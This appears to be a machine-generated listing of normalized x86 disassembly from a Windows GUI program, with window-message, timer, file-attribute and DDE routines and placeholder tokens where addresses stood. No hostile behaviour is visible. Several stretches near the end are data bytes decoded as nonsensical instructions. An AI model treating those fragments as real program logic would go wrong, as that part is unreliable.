pop ecx
pop ebp
retn
sub_45e784
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_4281f8
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_45b2dc
sub_45e7a4
call sub_4036c0
retn
sub_45e7fc
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_45e862
jmp sub_403e54
sub_45ea10
jmp sub_403ba0
sub_45ea3c
xor edx edx
call sub_45b640
retn
sub_45ea44
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_45b640
mov eax ebx
call sub_441fc4
pop ebx
retn
sub_45eaca
jmp sub_403e54
sub_45ead1
pop ebx
pop ecx
pop ebp
retn
sub_45ead8
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_448484
push eax
call PostMessageA
pop ebx
retn
sub_45ecc3
jmp sub_403e54
sub_45ed64
jmp sub_403e54
sub_45ed6e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ed8b
lea eax [ ebp - 0x20 ]
call sub_40442c
retn
sub_45ed84
jmp sub_403e54
sub_45ed8b
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ee6c
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_441170
retn
mov edx eax
mov eax [ rw-data ]
call sub_4605ac
retn
sub_45f1f0
mov edx eax
mov eax [ rw-data ]
call sub_461f40
mov al 0x1
retn
sub_45f2d8
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_45f200
sub_45f2ec
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_45f200
sub_45f300
cmp edx [ eax + 0x2e4 ]
je r-xdata
retn
mov [ eax + 0x2e4 ] edx
call sub_45f200
sub_45f314
cmp dl [ eax + 0x2e2 ]
je r-xdata
retn
mov [ eax + 0x2e2 ] dl
call sub_45f200
sub_45f328
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e2 ] 0x0
je r-xdata
sub_45f493
jmp sub_403e54
sub_45f49a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f4a0
push ebx
mov ebx eax
mov eax ebx
call sub_446e00
mov eax ebx
call sub_446f84
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45ead8
sub_45f716
jmp sub_403e54
sub_45f71d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45f724
push ebx
mov ebx edx
mov edx ebx
call sub_447268
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_441278
pop ebx
retn
sub_45f778
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45f7e0
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45f790
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45f7e0
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45f7ac
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45f7e0
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45f7c4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45f7e0
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45fa30
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45fa3c
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45fa48
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45fa54
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45fa60
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45fa6c
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45fa78
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_4161a0
pop esi
pop ebx
retn
sub_45fa8c
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45faa8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4161a0
pop esi
pop ebx
retn
sub_45fabc
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_45fac4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4161a0
pop esi
pop ebx
retn
sub_45fad8
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_45fbb4
mov eax [ eax + 0x54 ]
call sub_416044
retn
sub_45fbc0
mov eax [ eax + 0x54 ]
call sub_416340
retn
sub_45fe13
jmp sub_403e54
sub_45fe57
jmp sub_403e54
sub_45fe5e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45feac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45fcac
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_404480
pop esi
pop ebx
retn
sub_45ff18
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_4161a0
pop esi
pop ebx
retn
sub_45ff2c
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_460131
jmp sub_403e54
sub_460138
pop ebx
mov esp ebp
pop ebp
retn
sub_460140
inc [ eax + 0x8c ]
retn
sub_460148
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_460168
sub_460168
xor edx edx
call sub_4605ac
retn
sub_46059e
jmp sub_403e54
sub_460625
jmp sub_403e54
sub_460634
add eax 0x30
call sub_40dabc
retn
sub_460678
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_4606c9
jmp sub_403ba0
sub_4606ce
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_461f40
call sub_403f08
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_460d93
jmp sub_403e54
sub_460d9a
pop ebx
mov esp ebp
pop ebp
retn
sub_460f20
xor edx edx
call sub_460e70
retn
sub_460f28
mov dl 0x1
call sub_460e70
retn
sub_460f9c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_460fb4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_461081
jmp sub_403e54
sub_461088
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4617a8
jmp sub_403ba0
sub_461c94
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_461bfc
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
sub_461da8
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_403ba0#9
jmp sub_403ba0
j_sub_403ba0#8
jmp sub_403ba0
sub_461f1e
jmp sub_403e54
sub_461f25
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461f2c
call sub_40d39c
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_462125
jmp sub_403e54
sub_46212c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4621f3
jmp sub_403e54
sub_4621fa
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462398
jmp sub_403e54
sub_46239f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462400
jmp sub_403e54
sub_462407
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462410
call sub_462210
retn
j_sub_403ba0#7
jmp sub_403ba0
sub_46265e
jmp sub_403e54
sub_462665
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462791
jmp sub_403e54
sub_4628f0
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_462bef
jmp sub_403e54
sub_462c1e
jmp sub_403e54
sub_46303b
jmp sub_403e54
sub_463042
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463088
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
mov eax [ eax + 0xb0 ]
retn
push 0x0
push 0x1
push 0xb031
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
retn
sub_4631b8
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_463203
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_463214
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_463224
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_463297
jmp sub_403e54
sub_46329e
pop ebp
retn
sub_4632a0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_404200
call sub_4631b8
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_4590e0
call sub_415b04
sub_463702
jmp sub_403e54
sub_463709
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_463881
jmp sub_403e54
sub_463888
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4638d5
jmp sub_403e54
sub_4638dc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463aed
jmp sub_403e54
sub_463af4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_463cc6
jmp sub_403e54
sub_463ccd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_463cfd
jmp sub_403e54
sub_463d04
pop ebp
retn
sub_463d08
sub [ rw-data ] 0x1
retn
sub_4649e8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443404
movsx eax [ esi + 0x8 ]
mov [ ebx + 0x234 ] eax
pop esi
pop ebx
retn
sub_464a64
push ebx
mov ebx eax
mov eax ebx
call sub_446c1c
mov eax ebx
call sub_464db4
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_465244
sub_464ae0
jmp sub_403e54
sub_464ae7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464b84
jmp sub_403e54
sub_464b8b
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_464c8a
jmp sub_403e54
sub_464c91
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464da6
jmp sub_403e54
sub_464dad
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464db4
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
setne al
pop ebx
retn
sub_464e79
jmp sub_403e54
sub_464e80
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464f54
mov eax [ eax + 0x208 ]
retn
sub_4651a2
jmp sub_403e54
sub_465234
jmp sub_403e54
sub_46523b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465284
xor edx edx
call sub_464b94
retn
sub_46528c
mov al 0x1
retn
sub_46547d
jmp sub_403e54
sub_465484
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46566a
jmp sub_403e54
sub_465671
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4656b0
push ebx
mov ebx eax
mov eax edx
dec eax
mov edx eax
mov eax ebx
call sub_4656f4
mov edx eax
mov eax ebx
call sub_464fd4
pop ebx
retn
sub_465904
jmp sub_403e54
sub_46590b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465997
jmp sub_403e54
sub_46599e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465a25
jmp sub_403e54
sub_465a2c
pop ebx
mov esp ebp
pop ebp
retn
sub_465b32
jmp sub_403e54
sub_465b39
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_465d8a
jmp sub_403e54
sub_465d91
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465e34
mov edx [ rw-data ]
cmp [ edx + 0x4 ] 0x11
jne r-xdata
xor eax eax
retn
add al 0x5f
sub al 0x3f
jb r-xdata
mov al 0x1
retn
sub_465f1a
jmp sub_403e54
sub_465f21
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4661de
jmp sub_403e54
sub_4661e5
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4665f8
jmp sub_403e54
sub_4665ff
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46668d
jmp sub_403e54
sub_466694
pop ebp
retn
sub_466698
sub [ rw-data ] 0x1
retn
DdeInitializeA
jmp [ DdeInitializeA@IAT ]
DdeUninitialize
jmp [ DdeUninitialize@IAT ]
DdeConnect
jmp [ DdeConnect@IAT ]
DdeDisconnect
jmp [ DdeDisconnect@IAT ]
DdeQueryConvInfo
jmp [ __import_lookup_table_15(user32:DdeQueryConvInfo) ]
DdeSetUserHandle
jmp [ __import_lookup_table_15(user32:DdeSetUserHandle) ]
DdePostAdvise
jmp [ __import_lookup_table_15(user32:DdePostAdvise) ]
DdeNameService
jmp [ __import_lookup_table_15(user32:DdeNameService) ]
DdeClientTransaction
jmp [ __import_lookup_table_15(user32:DdeClientTransaction) ]
DdeCreateDataHandle
jmp [ DdeCreateDataHandle@IAT ]
DdeAccessData
jmp [ DdeAccessData@IAT ]
DdeUnaccessData
jmp [ DdeUnaccessData@IAT ]
DdeFreeDataHandle
jmp [ DdeFreeDataHandle@IAT ]
DdeGetLastError
jmp [ __import_lookup_table_15(user32:DdeGetLastError) ]
DdeQueryStringA
jmp [ DdeQueryStringA@IAT ]
DdeCmpStringHandles
jmp [ DdeCmpStringHandles@IAT ]
sub_466755
jmp sub_403e54
sub_46675c
pop ebp
retn
sub_466760
sub [ rw-data ] 0x1
retn
sub_46720e
jmp sub_403e54
sub_467215
pop ebx
mov esp ebp
pop ebp
retn
sub_4674e0
jmp sub_403e54
sub_4674e7
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_467668
jmp sub_403e54
sub_46766f
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4677ad
jmp sub_403e54
sub_4677b4
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4678a4
jmp sub_403e54
sub_4678ab
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4679ba
jmp sub_403e54
sub_4679c1
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467a73
jmp sub_403e54
sub_467a7a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_467a80
push ebx
mov ecx [ eax + 0x40 ]
mov ebx [ ecx + 0x8 ]
mov eax ecx
mov ecx edx
mov edx ebx
call sub_41621c
pop ebx
retn
sub_467a94
mov eax [ eax + 0x40 ]
call sub_416340
retn
sub_467bde
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
sub_467bec
jmp sub_403e54
j_sub_467bde
jmp sub_467bde
sub_467bf3
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_467ca3
jmp sub_403e54
sub_467caa
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_467d73
jmp sub_403e54
sub_467d7a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46810e
jmp sub_403e54
sub_468115
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4682c4
mov [ eax + 0xc6 ] 0x0
retn
sub_4683a8
cmp dl [ eax + 0xc7 ]
je r-xdata
retn
mov [ eax + 0xc7 ] dl
cmp [ eax + 0x38 ] 0x0
je r-xdata
xor ecx ecx
xor edx edx
call sub_468310
sub_4683c8
retn
sub_4683cc
retn
sub_4683d0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_404480
pop esi
pop ebx
retn
sub_4683e4
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_404480
pop esi
pop ebx
retn
sub_4683f8
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_468418
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_46859b
jmp sub_403e54
sub_4685a2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4686b4
retn
sub_4686b8
retn
sub_4687c9
jmp sub_403e54
sub_4687d0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4688a8
jmp sub_403e54
sub_4688af
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_468920
push ecx
push edx
call DdeAccessData
retn
sub_468928
push edx
call DdeUnaccessData
retn
sub_468a48
mov eax [ eax + 0x10 ]
call sub_468640
retn
sub_468ad0
mov [ eax + 0x34 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_41e274
sub_468bac
jmp sub_403e54
sub_468bb3
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_468c43
jmp sub_403e54
sub_468c4a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468cd3
jmp sub_403e54
sub_468cda
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468ce4
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_468e23
jmp sub_403e54
sub_468e2a
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468e34
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_468e48
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_469044
jmp sub_403e54
sub_46904b
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46912b
jmp sub_403e54
sub_469132
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_46925d
jmp sub_403e54
sub_469264
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_469515
jmp sub_403e54
sub_46951c
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469528
mov edx [ eax + 0x38 ]
push edx
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdePostAdvise
retn
sub_4695d1
jmp sub_403e54
sub_4695d8
pop ebp
retn
sub_469665
jmp sub_403e54
sub_46966c
pop ebp
retn
sub_469670
sub [ rw-data ] 0x1
retn
sub_46969d
jmp sub_403e54
sub_4696a4
pop ebp
retn
sub_4696a8
sub [ rw-data ] 0x1
retn
sub_46974d
jmp sub_403e54
sub_469754
pop ebp
retn
sub_469758
sub [ rw-data ] 0x1
retn
sub_46a198
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
sete al
retn
sub_46a91f
jmp sub_403e54
sub_46a95b
jmp sub_403e54
sub_46b2a8
jmp sub_403e54
sub_46b2af
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b538
call sub_4432bc
retn
sub_46b540
push ebx
mov ebx eax
mov eax ebx
call sub_46b55c
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_46b554
mov eax [ r-xdata ]
retn
sub_46b55c
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x4 ]
retn
sub_46b568
push esi
mov esi eax
mov eax [ esi + 0x16c ]
call sub_46a30c
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_46b580
mov eax [ eax + 0x16c ]
mov al [ eax + 0x20 ]
retn
sub_46b5b8
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_46b668
push esi
mov esi eax
cmp dl [ esi + 0x180 ]
je r-xdata
pop esi
retn
mov [ esi + 0x180 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46b684
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
call sub_46b5c0
sub_46b698
push esi
mov esi eax
cmp dl [ esi + 0x173 ]
je r-xdata
pop esi
retn
mov [ esi + 0x173 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46b6b4
push esi
mov esi eax
cmp edx [ esi + 0x17c ]
je r-xdata
pop esi
retn
cmp edx 0xffffffff
jl r-xdata
mov [ esi + 0x17c ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46b6d4
push esi
mov esi eax
cmp edx [ esi + 0x174 ]
je r-xdata
pop esi
retn
mov [ esi + 0x174 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46b72c
cmp dl [ eax + 0x172 ]
je r-xdata
retn
mov [ eax + 0x172 ] dl
call sub_46b5c0
sub_46b740
push esi
mov esi eax
mov eax esi
call sub_44346c
cmp [ esi + 0x170 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_4038bc
sub_46b88d
jmp sub_403e54
sub_46b894
pop edi
pop esi
pop ecx
pop ebp
retn
sub_46b89c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_46b8a4
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_46b8ac
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x16c ]
mov eax esi
call sub_46a294
mov dl [ ebx + 0x182 ]
mov eax esi
call sub_46a3ac
pop esi
pop ebx
retn
sub_46ba8c
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_4036c0
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_46bb4f
retn
sub_46bb50
jmp sub_403e54
j_sub_46bb4f
jmp sub_46bb4f
sub_46bb57
pop ebp
retn
sub_46bb5c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_404200
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402fc4
sub_46bf13
jmp sub_403ba0
sub_46bf4b
jmp sub_403e54
sub_46bf52
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46c211
jmp sub_403e54
sub_46c2c0
push ebx
mov ebx eax
mov eax ebx
call sub_4048dc
push eax
call GetFileAttributesA
cmp eax 0xffffffff
setne al
pop ebx
retn
j_sub_403ba0#6
jmp sub_403ba0
sub_46c4b0
jmp sub_403e54
sub_46c4b7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c4c0
call sub_4396a4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_462a60
retn
sub_46c5ac
jmp sub_403e54
sub_46c5b3
pop ebx
mov esp ebp
pop ebp
retn
sub_46c5b8
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
xor edx edx
mov [ eax + 0x44 ] edx
test [ eax + 0x5e ] 0x1
jne r-xdata
mov edx r-xdata
mov [ eax + 0x44 ] edx
jmp r-xdata
call sub_43a058
retn
sub_46c836
jmp sub_403e54
sub_46c83d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c85a
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
sub_46c853
jmp sub_403e54
sub_46c85a
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46c896
add [ eax ] al
cmp [ ecx ] 0x1b
jne r-xdata
retn
mov eax edx
call sub_45e89c
sub_46c937
jmp sub_403e54
sub_46c93e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_46c969
jmp sub_403e54
sub_46c970
pop ebp
retn
sub_46c974
sub [ rw-data ] 0x1
retn
sub_46c9d0
jmp sub_403e54
sub_46c9d7
pop ebp
retn
sub_46c9dc
sub [ rw-data ] 0x1
retn
sub_46ca38
jmp sub_403e54
sub_46ca3f
pop ebp
retn
sub_46ca44
sub [ rw-data ] 0x1
retn
sub_46caa5
jmp sub_403e54
sub_46caac
pop ebp
retn
sub_46cab0
sub [ rw-data ] 0x1
retn
sub_46cadd
jmp sub_403e54
sub_46cae4
pop ebp
retn
sub_46cae8
sub [ rw-data ] 0x1
retn
sub_46caf4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x900046cb

sub_46d84c
mov edx [ eax + 0xc ]
test edx edx
je r-xdata
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_46d8c4
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_404480
mov eax ebx
call sub_46d84c
pop esi
pop ebx
retn
sub_46d8e0
mov [ eax + 0x14 ] edx
call sub_46d84c
retn
sub_46d8ec
mov [ eax + 0x18 ] edx
call sub_46d84c
retn
sub_46d924
push ebx
mov ebx eax
mov eax ebx
call sub_417058
mov [ eax + 0xc ] ebx
pop ebx
retn
sub_46daa4
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
test dl dl
je r-xdata
mov edx sub_46d8f8
call sub_46d934
sub_46dabc
mov edx sub_46d8f8
call sub_46d934
retn
sub_46dc22
jmp sub_403e54
sub_46dc5c
push ebx
mov ebx ecx
mov eax ebx
call sub_40442c
pop ebx
retn
sub_46dc68
mov al 0x1
retn
sub_46dd6d
jmp sub_403e54
sub_46de68
retn
sub_46e218
mov eax [ eax + 0xd0 ]
call sub_4171e4
retn
sub_46e288
mov eax [ r-xdata ]
retn
sub_46e2b4
push esi
mov esi eax
mov eax [ esi + 0xd0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_46e2e8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
pop ebx
retn
sub_46e3d8
retn
sub_46e51f
jmp sub_403e54
sub_46e526
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e530
retn
sub_46e553
jmp sub_403e54
sub_46e55a
pop ebp
retn 0x4
sub_46e5bd
jmp sub_403e54
sub_46e5c4
pop ebp
retn
sub_46e5c8
sub [ rw-data ] 0x1
retn
sub_470e34
cmp dl al
inc edi
add [ edx + eax * 8 + 0x47 ] dl
add [ ecx + eax * 8 ] ah
inc edi
add ah dh
rol [ edi ] 0x9c
rol [ edi ] 0x98
rol [ edi ] 0x8c
retn 0x47
sub_4717e5
iretd
sub_471af6
inc esp
add al dh
0x5a580047 0x44
sub_471bb4
fcos
lodsb [ esi ]
jmp [ eax - 0xb ]
sub_473539
0x46
sub_473bf1
jmp sub_403e54
sub_473c14
jmp sub_403e54
sub_473c1b
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473d5c
cmp dl [ eax + 0x24 ]
je r-xdata
retn
mov [ eax + 0x24 ] dl
mov [ eax + 0x25 ] 0x0
xor edx edx
call sub_416e44
sub_473d70
mov al [ eax + 0x25 ]
xor al 0x1
retn
sub_473d78
cmp dl [ eax + 0x25 ]
je r-xdata
retn
mov [ eax + 0x25 ] dl
call sub_473d88
sub_473dc0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_473dd8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x24 ] 0x1
je r-xdata
mov al 0x1
retn
sub_473e14
cmp dl [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] dl
xor edx edx
call sub_416e44
sub_473e44
mov ecx [ eax + 0x14 ]
cmp edx ecx
jge r-xdata
cmp edx 0x2710
jle r-xdata
mov edx ecx
mov [ eax + 0x18 ] edx
mov edx [ eax + 0x10 ]
call sub_473ebc
retn
mov edx 0x2710
sub_473e68
test edx edx
jge r-xdata
mov ecx [ eax + 0x18 ]
cmp edx ecx
